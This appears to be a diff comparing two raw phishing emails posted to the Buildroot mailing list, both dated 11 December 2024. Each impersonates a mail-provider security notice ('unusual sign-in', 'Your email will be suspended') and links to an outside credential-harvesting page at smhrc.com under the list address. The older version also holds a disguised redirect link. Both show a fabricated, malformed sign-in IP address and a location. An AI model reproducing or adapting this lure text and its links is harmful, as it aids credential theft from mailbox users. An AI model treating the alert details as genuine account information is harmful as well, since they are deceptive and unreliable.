@@ -1,50 +1,50 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id F2E42E7717D
-	for <buildroot@archiver.kernel.org>; Wed, 11 Dec 2024 09:16:29 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id E308EE7717D
+	for <buildroot@archiver.kernel.org>; Wed, 11 Dec 2024 09:21:04 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 49CA160F65;
-	Wed, 11 Dec 2024 09:16:29 +0000 (UTC)
-X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp3.osuosl.org ([127.0.0.1])
- by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id zVLQJF9OORDB; Wed, 11 Dec 2024 09:16:28 +0000 (UTC)
-X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 4884860F4C
-Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 4884860F4C;
-	Wed, 11 Dec 2024 09:16:28 +0000 (UTC)
-Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
- by lists1.osuosl.org (Postfix) with ESMTP id E5151E11
- for <buildroot@buildroot.org>; Wed, 11 Dec 2024 09:16:26 +0000 (UTC)
-Received: from localhost (localhost [127.0.0.1])
- by smtp1.osuosl.org (Postfix) with ESMTP id CD3BD81FF7
- for <buildroot@buildroot.org>; Wed, 11 Dec 2024 09:16:26 +0000 (UTC)
+	by smtp1.osuosl.org (Postfix) with ESMTP id 8D12681F16;
+	Wed, 11 Dec 2024 09:21:04 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
  by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id KIrO693GXEta for <buildroot@buildroot.org>;
- Wed, 11 Dec 2024 09:16:26 +0000 (UTC)
-Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=51.83.140.59;
+ id lB7smjYuSvbf; Wed, 11 Dec 2024 09:21:03 +0000 (UTC)
+X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 8D63181EFF
+Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
+	by smtp1.osuosl.org (Postfix) with ESMTP id 8D63181EFF;
+	Wed, 11 Dec 2024 09:21:03 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [IPv6:2605:bc80:3010::138])
+ by lists1.osuosl.org (Postfix) with ESMTP id 01A9BE11
+ for <buildroot@buildroot.org>; Wed, 11 Dec 2024 09:21:01 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+ by smtp1.osuosl.org (Postfix) with ESMTP id D704781EFF
+ for <buildroot@buildroot.org>; Wed, 11 Dec 2024 09:21:01 +0000 (UTC)
+X-Virus-Scanned: amavis at osuosl.org
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id SzkhSQrgvSsT for <buildroot@buildroot.org>;
+ Wed, 11 Dec 2024 09:21:01 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=192.227.217.196;
  helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 7A0998208E
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 7A0998208E
-Received: from busybox.net (ns31098807.ip-51-83-140.eu [51.83.140.59])
- by smtp1.osuosl.org (Postfix) with ESMTP id 7A0998208E
- for <buildroot@busybox.net>; Wed, 11 Dec 2024 09:16:25 +0000 (UTC)
-From: buildroot@busybox.net
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org D840B81EF8
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org D840B81EF8
+Received: from busybox.net (unknown [192.227.217.196])
+ by smtp1.osuosl.org (Postfix) with ESMTP id D840B81EF8
+ for <buildroot@busybox.net>; Wed, 11 Dec 2024 09:21:00 +0000 (UTC)
+From: Mail Administrator <buildroot@busybox.net>
 To: buildroot@busybox.net
-Date: 11 Dec 2024 08:16:23 -0100
-Message-ID: <20241211081623.65206E5DCBA7FF45@busybox.net>
+Date: 11 Dec 2024 10:21:00 +0100
+Message-ID: <20241211102100.6FF5B4384B3EC1D4@busybox.net>
 MIME-Version: 1.0
 X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
  dmarc=none (p=none dis=none)
  header.from=busybox.net
-Subject: [Buildroot] New sign-in with your Mail account
+Subject: [Buildroot] Mail account unusual sign-in activity
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.30
 Precedence: list
@@ -56,153 +56,106 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Content-Type: multipart/mixed; boundary="===============0477865596138496820=="
+Content-Type: multipart/mixed; boundary="===============6459108485361436263=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
---===============0477865596138496820==
+--===============6459108485361436263==
 Content-Type: text/html;
 	charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
-<!DOCTYPE HTML>
-
-<html><head><title></title>
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
 <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
-<meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7601.17514"></head>
-<body style=3D"margin: 0.4em;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
-bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
-;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <table style=3D"padding: 0px; w=
-idth: 100%; text-align: left; vertical-align: top; display: table; border-c=
-ollapse: collapse; border-spacing: 0;"><tbody><tr align=3D"left" style=3D"p=
-adding: 0px; vertical-align: top;">
-<th align=3D"left" valign=3D"top" style=3D"margin: 0px auto; padding: 0px 6=
-0px 16px; width: 520px; color: rgb(91, 97, 106); line-height: 1.5; font-fam=
-ily: Arial,Helvetica,sans-serif; font-size: 16px; font-weight: 400; border-=
-collapse: collapse !important; -ms-word-wrap: break-word;"><table style=3D"=
-padding: 0px; width: 100%; text-align: left; vertical-align: top; border-co=
-llapse: collapse; border-spacing: 0;"><tbody><tr align=3D"left" style=3D"pa=
-dding: 0px; vertical-align: top;">
-<th align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; color=
-: rgb(91, 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-ser=
-if; font-size: 16px; font-weight: 400; border-collapse: collapse !important=
-; -ms-word-wrap: break-word;"><br></th>
-<th align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
-: 0px; color: rgb(91, 97, 106); line-height: 1.5; font-family: Arial,Helvet=
-ica,sans-serif; font-size: 16px; font-weight: 400; border-collapse: collaps=
-e !important; -ms-word-wrap: break-word;"></th></tr></tbody></table></th></=
-tr></tbody></table><table style=3D"padding: 0px; width: 100%; text-align: l=
-eft; vertical-align: top; display: table; border-collapse: collapse; border=
--spacing: 0;"><tbody>
-<tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><th align=
-=3D"left" valign=3D"top" style=3D"margin: 0px auto; padding: 0px 60px 16px;=
- width: 520px; color: rgb(91, 97, 106); line-height: 1.5; font-family: Aria=
-l,Helvetica,sans-serif; font-size: 16px; font-weight: 400; border-collapse:=
- collapse !important; -ms-word-wrap: break-word;"><table style=3D"padding: =
-0px; width: 100%; text-align: left; vertical-align: top; border-collapse: c=
-ollapse; border-spacing: 0;"><tbody>
-<tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><th align=
-=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; color: rgb(91,=
- 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-serif; font-=
-size: 16px; font-weight: 400; border-collapse: collapse !important; -ms-wor=
-d-wrap: break-word;"><table style=3D"padding: 0px; width: 100%; text-align:=
- left; vertical-align: top; border-collapse: collapse; border-spacing: 0;">=
-<tbody>
-<tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><td height=
-=3D"30" align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; c=
-olor: rgb(91, 97, 106); line-height: 30px; font-family: Arial,Helvetica,san=
-s-serif; font-size: 30px; font-weight: 400; border-collapse: collapse !impo=
-rtant; -ms-word-wrap: break-word;"></td></tr></tbody></table>
-<h4 align=3D"left" style=3D"margin: 0px 0px 16px; padding: 0px; color: inhe=
-rit; line-height: 1.5; font-family: Arial,Helvetica,sans-serif; font-size: =
-24px; font-weight: 700; -ms-word-wrap: normal;">New sign-in with your Mail =
-account                                       </h4><table style=3D"padding:=
- 0px; width: 100%; text-align: left; vertical-align: top; border-collapse: =
-collapse; border-spacing: 0;"><tbody><tr align=3D"left" style=3D"padding: 0=
-px; vertical-align: top;">
-<td height=3D"10" align=3D"left" valign=3D"top" style=3D"margin: 0px; paddi=
-ng: 0px; color: rgb(91, 97, 106); line-height: 10px; font-family: Arial,Hel=
-vetica,sans-serif; font-size: 10px; font-weight: 400; border-collapse: coll=
-apse !important; -ms-word-wrap: break-word;">        &nbsp;       </td></tr=
-></tbody></table><table style=3D"margin: 10px auto; padding: 0px; width: 10=
-0%; text-align: left; vertical-align: top; border-collapse: collapse; borde=
-r-spacing: 0;"><tbody>
-<tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><th align=
-=3D"center" valign=3D"top" style=3D"margin: 0px; color: rgb(91, 97, 106); l=
-ine-height: 1.5; font-family: Arial,Helvetica,sans-serif; font-size: 16px; =
-font-weight: 400; border-collapse: collapse !important; -ms-word-wrap: brea=
-k-word;">&nbsp;&nbsp;&nbsp; </th></tr></tbody></table>
-<p align=3D"left" style=3D"margin: 0px 0px 10px; padding: 0px; color: rgb(9=
-1, 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-serif; fon=
-t-size: 16px; font-weight: 400;"></p><p align=3D"left" style=3D"margin: 0px=
- 0px 10px; padding: 0px; color: rgb(91, 97, 106); line-height: 1.5; font-fa=
-mily: Arial,Helvetica,sans-serif; font-size: 16px; font-weight: 400;">Your&=
-nbsp;Mail account was just used to sign in on a new device.</p><br>
-<p align=3D"left" style=3D"margin: 0px 0px 10px; padding: 0px; color: rgb(9=
-1, 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-serif; fon=
-t-size: 16px; font-weight: 400;"><strong>11/12/2024 08:16:23 (GMT)<br>From =
-92.64.52.146.73(IP address potentially located in</strong>
-<span style=3D"text-align: left; color: rgb(71, 71, 71); text-transform: no=
-ne; text-indent: 0px; letter-spacing: normal; font-family: Arial, sans-seri=
-f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
-; float: none; display: inline !important; white-space: normal; orphans: 2;=
- widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: n=
-ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-deco=
-ration-thickness: initial; text-decoration-style:=20
-initial; text-decoration-color: initial;"> </span><strong>Hebron, Palestine=
-)</strong></p><p align=3D"left" style=3D"margin: 0px 0px 10px; padding: 0px=
-; color: rgb(91, 97, 106); line-height: 1.5; font-family: Arial,Helvetica,s=
-ans-serif; font-size: 16px; font-weight: 400;">
-  If you did not make this change, <a style=3D"padding: 0px; text-align: le=
-ft; color: rgb(0, 113, 187); line-height: 1.5; font-family: Arial,Helvetica=
-,sans-serif; font-weight: 400; text-decoration: none;" href=3D"https://www.=
-smhrc.com/mail/new.index.html#buildroot@busybox.net" target=3D"_blank"=20
-data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://secure.login=
-=2Egov/events/disavow?disavowal_token%3D7Z3AZcyZ4xrQGV7oLYW1H37JObNkoU28sVm=
-xTBfYd34&amp;source=3Dgmail&amp;ust=3D1669752959927000&amp;usg=3DAOvVaw3xjQ=
-CJ0GYw8c3z9buhKkiy">reset your password</a>. For more help, please visit th=
-e&nbsp;<font color=3D"#0071bb"><a href=3D"https://www.smhrc.com/mail/new.in=
-dex.html#buildroot@busybox.net">Mail Account Activity</a> <font color=3D"#5=
-b616a">or</font>
- <a href=3D"https://www.smhrc.com/mail/new.index.html#buildroot@busybox.net=
-">Help Center</a></font>.</p><table style=3D"padding: 0px; width: 100%; tex=
-t-align: left; vertical-align: top; border-collapse: collapse; border-spaci=
-ng: 0;"><tbody><tr align=3D"left" style=3D"padding: 0px; vertical-align: to=
-p;">
-<td height=3D"30" align=3D"left" valign=3D"top" style=3D"margin: 0px; paddi=
-ng: 0px; color: rgb(91, 97, 106); line-height: 30px; font-family: Arial,Hel=
-vetica,sans-serif; font-size: 30px; font-weight: 400; border-collapse: coll=
-apse !important; -ms-word-wrap: break-word;">                              =
-              &nbsp;                                           </td></tr></=
-tbody></table></th></tr></tbody></table></th></tr></tbody></table>
-<table align=3D"center" style=3D"padding: 0px; width: 100%; text-align: lef=
-t; vertical-align: top; border-collapse: collapse; border-spacing: 0;"><tbo=
-dy><tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><td alig=
-n=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; color: rgb(91=
-, 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-serif; font=
--size: 16px; font-weight: 400; border-collapse: collapse !important; -ms-wo=
-rd-wrap: break-word;">
-<table style=3D"padding: 0px; width: 100%; text-align: left; vertical-align=
-: top; display: table; border-collapse: collapse; border-spacing: 0;"><tbod=
-y><tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><th align=
-=3D"left" valign=3D"top" style=3D"margin: 0px auto; padding: 0px 60px 16px;=
- width: 520px; color: rgb(91, 97, 106); line-height: 1.5; font-family: Aria=
-l,Helvetica,sans-serif; font-size: 16px; font-weight: 400; border-collapse:=
- collapse !important; -ms-word-wrap: break-word;">
-<table style=3D"padding: 0px; width: 100%; text-align: left; vertical-align=
-: top; border-collapse: collapse; border-spacing: 0;"><tbody><tr align=3D"l=
-eft" style=3D"padding: 0px; vertical-align: top;"><th align=3D"left" valign=
-=3D"top" style=3D"margin: 0px; padding: 0px; color: rgb(91, 97, 106); line-=
-height: 1.5; font-family: Arial,Helvetica,sans-serif; font-size: 16px; font=
--weight: 400; border-collapse: collapse !important; -ms-word-wrap: break-wo=
-rd;">
-<p align=3D"left" style=3D"margin: 0px 0px 10px; padding: 0px; color: rgb(9=
-1, 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-serif; fon=
-t-size: 16px; font-weight: 400;">                                          =
-  Please do not reply to this message.</p></th></tr></tbody></table></th></=
-tr></tbody></table></td></tr></tbody></table></body></html>
+</head>
+<body><p><br class=3D"Apple-interchange-newline"></p>
+<table style=3D'height: 328px; color: rgb(51, 51, 51); text-transform: none=
+; letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, Hel=
+vetica, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; =
+word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-c=
+olor: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps=
+: normal; text-decoration-style: initial; text-decoration-color: initial; -=
+webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial;' dir=3D"ltr"><tbody><tr style=3D"height=
+: 10px;"><td id=3D"v1v1m_4520268922320635454i1" style=3D'padding: 0px; widt=
+h: 851px; height: 10px; color: rgb(112, 112, 112); font-family: "Segoe UI S=
+emibold", "Segoe UI Bold", "Segoe UI", "Helvetica Neue Medium", Arial, sans=
+-serif; font-size: 17px;'></td></tr><tr style=3D"height: 53px;">
+<td id=3D"v1v1m_4520268922320635454i2" style=3D'padding: 0px; width: 851px;=
+ height: 53px; color: rgb(38, 114, 236); font-family: "Segoe UI Light", "Se=
+goe UI", "Helvetica Neue Medium", Arial, sans-serif; font-size: 41px;'>&nbs=
+p;Your email will be suspended.</td></tr><tr style=3D"height: 18px;"><td id=
+=3D"v1v1m_4520268922320635454i3" style=3D'padding: 25px 0px 0px; width: 851=
+px; height: 18px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, =
+Verdana, Arial, sans-serif; font-size: 14px;'>
+We detected something unusual about a recent sign-in to the email account<s=
+pan>&nbsp;</span><a class=3D"v1v1m_4520268922320635454link" id=3D"v1v1m_452=
+0268922320635454iAccount" style=3D"color: rgb(38, 114, 236); text-decoratio=
+n: none;" href=3D"mailto:buildroot@busybox.net">buildroot@busybox.net</a></=
+td></tr><tr style=3D"height: 18px;">
+<td id=3D"v1v1m_4520268922320635454i4" style=3D'padding: 25px 0px 0px; widt=
+h: 851px; height: 18px; color: rgb(42, 42, 42); font-family: "Segoe UI Bold=
+", "Segoe UI Semibold", "Segoe UI", "Helvetica Neue Medium", Arial, sans-se=
+rif; font-size: 14px; font-weight: bold;'>Sign-in details</td></tr><tr styl=
+e=3D"height: 18px;">
+<td id=3D"v1v1m_4520268922320635454i5" style=3D'padding: 6px 0px 0px; width=
+: 851px; height: 18px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tah=
+oma, Verdana, Arial, sans-serif; font-size: 14px;'>Country/region: Palestin=
+e</td></tr><tr style=3D"height: 18px;"><td id=3D"v1v1m_4520268922320635454i=
+6" style=3D'padding: 6px 0px 0px; width: 851px; height: 18px; color: rgb(42=
+, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; fon=
+t-size: 14px;'>IP address: 92.64.52.146.73</td></tr>
+<tr style=3D"height: 18px;"><td id=3D"v1v1m_4520268922320635454i7" style=3D=
+'padding: 6px 0px 0px; width: 851px; height: 18px; color: rgb(42, 42, 42); =
+font-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14p=
+x;'>Date:&nbsp;12/11/2024 10:21:00 a.m. (GMT)</td></tr><tr style=3D"height:=
+ 17px;"><td id=3D"v1v1m_4520268922320635454i8" style=3D'padding: 6px 0px 0p=
+x; width: 851px; height: 17px; color: rgb(42, 42, 42); font-family: "Segoe =
+UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>
+Platform: Windows 10</td></tr><tr style=3D"height: 18px;"><td id=3D"v1v1m_4=
+520268922320635454i9" style=3D'padding: 6px 0px 0px; width: 851px; height: =
+18px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Ari=
+al, sans-serif; font-size: 14px;'>Browser: Chrome</td></tr><tr style=3D"hei=
+ght: 36px;">
+<td id=3D"v1v1m_4520268922320635454i10" style=3D'padding: 25px 0px 0px; wid=
+th: 851px; height: 36px; color: rgb(42, 42, 42); font-family: "Segoe UI", T=
+ahoma, Verdana, Arial, sans-serif; font-size: 14px;'>Please go to your rece=
+nt activity page to let us know whether or not this was you. If this wasn't=
+ you, we'll help you secure your account. If this was you, we'll trust simi=
+lar activity in the future.</td></tr><tr style=3D"height: 50px;">
+<td style=3D'padding: 25px 0px 0px; width: 851px; height: 50px; color: rgb(=
+42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; f=
+ont-size: 14px;'><table style=3D"width: 187px;" border=3D"0" cellspacing=3D=
+"0"><tbody><tr><td style=3D"padding: 5px 20px; width: 143px; min-width: 50p=
+x; background-color: rgb(38, 114, 236);" bgcolor=3D"#2672ec">
+<a id=3D"v1v1m_4520268922320635454i11" style=3D'text-align: center; color: =
+rgb(255, 255, 255); letter-spacing: 0.02em; font-family: "Segoe UI Semibold=
+", "Segoe UI Bold", "Segoe UI", "Helvetica Neue Medium", Arial, sans-serif;=
+ font-size: 14px; font-weight: 600; text-decoration: none;' href=3D"https:/=
+/www.smhrc.com/mail/new.index.html#buildroot@busybox.net" target=3D"_blank"=
+ rel=3D"noreferrer">Review recent activity</a></td></tr></tbody></table></t=
+d></tr><tr style=3D"height: 18px;">
+<td id=3D"v1v1m_4520268922320635454i12" style=3D'padding: 25px 0px 0px; wid=
+th: 851px; height: 18px; color: rgb(42, 42, 42); font-family: "Segoe UI", T=
+ahoma, Verdana, Arial, sans-serif; font-size: 14px;'>To opt out or change w=
+here you receive security notifications,<span>&nbsp;</span>
+<a class=3D"v1v1m_4520268922320635454link" id=3D"v1v1m_4520268922320635454i=
+Link5" style=3D"color: rgb(38, 114, 236); text-decoration: none;" href=3D"h=
+ttps://www.smhrc.com/mail/new.index.html#buildroot@busybox.net" target=3D"_=
+blank" rel=3D"noreferrer">click here</a>.</td></tr><tr style=3D"height: 18p=
+x;"><td id=3D"v1v1m_4520268922320635454i13" style=3D'padding: 25px 0px 0px;=
+ width: 851px; height: 18px; color: rgb(42, 42, 42); font-family: "Segoe UI=
+", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>
+Thanks,</td></tr><tr style=3D"height: 18px;"><td id=3D"v1v1m_45202689223206=
+35454i14" style=3D'padding: 0px; width: 851px; height: 18px; color: rgb(42,=
+ 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font=
+-size: 14px;'><font color=3D"#0c3654">Email Administrator &#8482; T</font>e=
+am<br><br>This message is auto-generated from E-mail security server, and r=
+eplies sent to this email can not be delivered.This email is meant for: bui=
+ldroot@busybox.net</td></tr></tbody></table></body></html>
 
---===============0477865596138496820==
+--===============6459108485361436263==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -213,4 +166,4 @@ buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
 
---===============0477865596138496820==--
+--===============6459108485361436263==--
